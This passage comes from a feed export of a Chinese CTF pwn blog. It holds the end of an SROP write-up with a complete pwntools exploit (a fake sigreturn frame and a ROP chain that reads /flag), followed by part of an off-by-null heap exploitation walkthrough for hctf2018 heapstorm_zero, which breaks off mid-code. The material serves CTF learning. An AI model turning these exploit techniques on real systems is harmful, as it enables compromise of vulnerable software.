class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  